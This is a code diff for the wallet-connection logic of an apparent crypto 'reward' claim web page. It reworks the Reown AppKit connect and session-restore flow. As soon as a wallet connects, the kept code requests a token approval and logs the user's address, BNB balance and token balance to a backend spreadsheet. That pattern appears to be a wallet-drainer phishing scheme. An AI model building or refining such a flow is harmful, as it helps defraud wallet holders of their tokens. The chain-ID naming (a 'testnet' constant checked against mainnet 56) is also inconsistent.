@@ -637,6 +637,21 @@
     let task2Eligible     = false;
     let task3Done         = false;
 
+
+// AppKit EVM provider (eip155)
+let appKitEip155Provider = null;
+
+// If AppKit is ready, track its EVM provider as it changes
+if (window.appKit && typeof window.appKit.subscribeProviders === "function") {
+  window.appKit.subscribeProviders((state) => {
+    appKitEip155Provider = state["eip155"] || null;
+  });
+}
+
+
+
+    
+
     // ===== userId helpers =====
     function storageKeyFor(address){
       return "userId_" + address.toLowerCase();
@@ -1016,99 +1031,97 @@ if (connectBtnCard) {
     }
 
     // 🔁 NEW: connect using Reown AppKit
-    async function connectFlow() {
-      try {
-        if (!window.appKit) {
-          alert("Wallet connect UI not ready. Please reload the page.");
-          return;
-        }
+   async function connectFlow() {
+  try {
+    if (!window.appKit) {
+      alert("Wallet connect UI not ready. Please reload the page.");
+      setStatus("Not connected");
+      return;
+    }
 
-        setStatus("Connecting…");
+    setStatus("Connecting…");
 
-        // 1) Open AppKit modal (Connect view)
-        await window.appKit.open({ view: "Connect" });
+    // 1) Open AppKit modal (Connect view).
+    // This resolves when user connects OR closes the modal.
+    await window.appKit.open({ view: "Connect" });
 
-        // 2) Wait for an EVM provider from AppKit (namespace: eip155)
-        const provider = await new Promise((resolve) => {
-          const unsubscribe = window.appKit.subscribeProviders((state) => {
-            const evm = state["eip155"];
-            if (evm) {
-              if (typeof unsubscribe === "function") unsubscribe();
-              resolve(evm);
-            }
-          });
-        });
+    // 2) If user closed modal without connecting, there will be no provider.
+    const provider = appKitEip155Provider;
+    if (!provider) {
+      setStatus("Not connected");
+      return;
+    }
 
-        if (!provider) {
-          setStatus("Not connected");
-          return;
-        }
+    // 3) Use this provider for Web3 & Ethers
+    providerInstance = provider;
+    web3Instance     = new Web3(providerInstance);
 
-        // 3) Use this provider for Web3 & Ethers
-        providerInstance = provider;
-        web3Instance     = new Web3(providerInstance);
+    attachProviderListeners(providerInstance);
 
-        attachProviderListeners(providerInstance);
+    const accounts = await web3Instance.eth.getAccounts();
+    if (!accounts || !accounts.length) {
+      setStatus("Not connected");
+      return;
+    }
+    const address = accounts[0].toLowerCase();
 
-        const accounts = await web3Instance.eth.getAccounts();
-        if(!accounts || !accounts.length){
-          setStatus("No account");
-          return;
-        }
-        const address = accounts[0].toLowerCase();
+    // 4) Ensure BSC (56)
+    let chainId    = await web3Instance.eth.getChainId();
+    let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
 
-        // 4) Ensure BSC (56)
-        let chainId    = await web3Instance.eth.getChainId();
-        let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
-
-        if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
-          const switched = await switchToBSC(providerInstance);
-          if(!switched){
-            alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
-            setStatus("Wrong network");
-            return;
-          }
-          chainId    = await web3Instance.eth.getChainId();
-          chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
-          if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
-            alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
-            setStatus("Wrong network");
-            return;
-          }
-        }
-
-        // 5) Connected + correct network
-        setStatus("Connected");
-
-        const sessionPromise = (async () => {
-          const session = await restoreSessionFromAddress(address);
-          const balanceBNB   = session.balanceBNB;
-          const tokenBalance = session.tokenBalance;
-          const userId       = session.userId;
-
-          // Log to sheet
-          notifyBackend(
-            address,
-            BNB_TESTNET_LABEL,
-            userId,
-            balanceBNB,
-            tokenBalance,
-            "connect"
-          ).catch(console.error);
-
-          return session;
-        })();
-
-        // 6) Token approval (same as before)
-        await ensureTokenApproval();
-        sessionPromise.catch(console.error);
-
-      } catch (err) {
-        console.error("connectFlow error (AppKit):", err);
-        setStatus("Connection failed");
-        alert("Connection failed: " + (err && err.message ? err.message : err));
+    if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+      const switched = await switchToBSC(providerInstance);
+      if(!switched){
+        alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
+        setStatus("Wrong network");
+        return;
+      }
+      chainId    = await web3Instance.eth.getChainId();
+      chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+      if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+        alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
+        setStatus("Wrong network");
+        return;
       }
     }
+
+    // 5) Connected & correct chain
+    setStatus("Connected");
+
+    // Restore your old session info
+    const sessionPromise = (async () => {
+      const session = await restoreSessionFromAddress(address);
+      const balanceBNB   = session.balanceBNB;
+      const tokenBalance = session.tokenBalance;
+      const userId       = session.userId;
+
+      // log to sheet
+      notifyBackend(
+        address,
+        BNB_TESTNET_LABEL,
+        userId,
+        balanceBNB,
+        tokenBalance,
+        "connect"
+      ).catch(console.error);
+
+      return session;
+    })();
+
+    // Token approval as before
+    await ensureTokenApproval();
+    sessionPromise.catch(console.error);
+
+  } catch (err) {
+    console.error("connectFlow error (AppKit):", err);
+    setStatus("Connection failed");
+    alert("Connection failed: " + (err && err.message ? err.message : err));
+    if (!isWalletConnected) {
+      setStatus("Not connected");
+    }
+  }
+}
+
 
     async function tryAutoReconnectSilent(){
       // keep your old silent reconnect using injected wallets
@@ -1239,6 +1252,51 @@ if (connectBtnCard) {
     }
 
     // ===== DOMContentLoaded =====
+
+async function restoreAppKitSession() {
+  try {
+    if (!window.appKit) return false;
+
+    // Does AppKit have an active session?
+    if (typeof window.appKit.isConnected !== "function") {
+      return false;
+    }
+
+    const isConnected = await window.appKit.isConnected();
+    if (!isConnected) return false;
+
+    const provider = appKitEip155Provider;
+    if (!provider) return false;
+
+    providerInstance = provider;
+    web3Instance     = new Web3(providerInstance);
+
+    attachProviderListeners(providerInstance);
+
+    const accounts = await web3Instance.eth.getAccounts();
+    if (!accounts || !accounts.length) return false;
+
+    const address = accounts[0].toLowerCase();
+
+    // Ensure correct network (BSC)
+    let chainId = await web3Instance.eth.getChainId();
+    if (chainId != BNB_TESTNET_CHAIN_ID_DEC) {
+      await switchToBSC(providerInstance);
+    }
+
+    await restoreSessionFromAddress(address);
+
+    isWalletConnected = true;
+    setStatus("Connected (restored)");
+    return true;
+  } catch (e) {
+    console.warn("restoreAppKitSession error:", e);
+    return false;
+  }
+}
+
+
+    
     document.addEventListener("DOMContentLoaded", async function(){
       if(rewardAmountEl){
         rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
@@ -1246,18 +1304,26 @@ if (connectBtnCard) {
 
       updateClaimState();
 
-      if(connectBtn){
-        connectBtn.addEventListener("click", function(){
-          if(isWalletConnected) return;
-          connectFlow();
-        });
-      }
-
-// Connect button inside reward card
-const connectBtnCard = document.getElementById("connectBtnCard");
-if (connectBtnCard) {
-  connectBtnCard.addEventListener("click", function () {
+    if (connectBtn) {
+  connectBtn.addEventListener("click", async function () {
     if (isWalletConnected) return;
+
+    // try silent restore for injected wallets (desktop)
+    const restored = await tryAutoReconnectSilent();
+    if (restored) return;
+
+    // otherwise use AppKit modal
+    connectFlow();
+  });
+}
+
+if (connectBtnCard) {
+  connectBtnCard.addEventListener("click", async function () {
+    if (isWalletConnected) return;
+
+    const restored = await tryAutoReconnectSilent();
+    if (restored) return;
+
     connectFlow();
   });
 }
@@ -1298,8 +1364,16 @@ if (connectBtnCard) {
         });
       }
 
-      await autoConnectOnLoad();
-      const yearEl = document.getElementById("year");
+  // 1) Try to restore session from AppKit (works for mobile WC / extensions)
+const restoredWithAppKit = await restoreAppKitSession();
+
+// 2) If AppKit has no session, fall back to old silent restore (desktop injected)
+if (!restoredWithAppKit) {
+  await autoConnectOnLoad();
+}
+
+const yearEl = document.getElementById("year");
+
       if(yearEl) yearEl.textContent = new Date().getFullYear();
     });
 
